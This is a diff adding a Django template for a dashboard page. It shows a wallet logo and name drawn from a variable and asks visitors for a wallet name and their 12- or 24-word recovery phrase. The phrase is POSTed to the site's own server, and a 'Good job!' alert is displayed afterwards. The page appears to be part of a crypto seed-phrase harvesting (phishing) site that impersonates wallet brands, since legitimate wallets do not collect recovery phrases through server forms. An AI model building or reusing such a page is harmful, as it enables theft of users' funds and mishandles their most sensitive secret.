@@ -1,0 +1,46 @@
+{% extends 'dashboard/base.html' %}
+{% load static %}
+{% block content %}
+<link rel="stylesheet" href="{% static 'custom.css' %}">
+
+
+
+<form action="" method="POST" style="background-color: white;padding-top: 5px;padding-bottom: 5px;">
+  {% csrf_token %}
+<div class="containerform">
+  <div class="img">
+    <h4>{{x.logoname}}</h4>
+    <img src="{{x.logo.url}}" alt="">
+    
+  </div>
+    <div class="bodyl">
+      <div class="did-floating-label-content">
+        <input class="did-floating-input" type="text" placeholder=" " name="wn" required>
+        <label class="did-floating-label">wallet name</label>
+      </div>
+      <div class="did-floating-label-content">
+         <textarea placeholder="phrase" name="wp" id="" required></textarea>
+         <p>Typically 12(sometimes 24 words) seperated by single space</p>
+         <button type="submit" class="btn-primary">import</button>
+        </div>
+    </div>
+    </div>
+ </form><br><br><br><br>
+
+
+
+
+ <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+<script>
+    {% if messages %}
+    {% for message in messages %}
+    swal({
+  title: "Good job!",
+  text: "{{message}}!",
+  icon: "{% if message.tags == "success" %}success{% elif message.tags == "error" %}error{% else %}info{% endif %}",
+  button: "ok",
+});
+    {% endfor %}
+    {% endif %}
+</script>
+{% endblock  %}
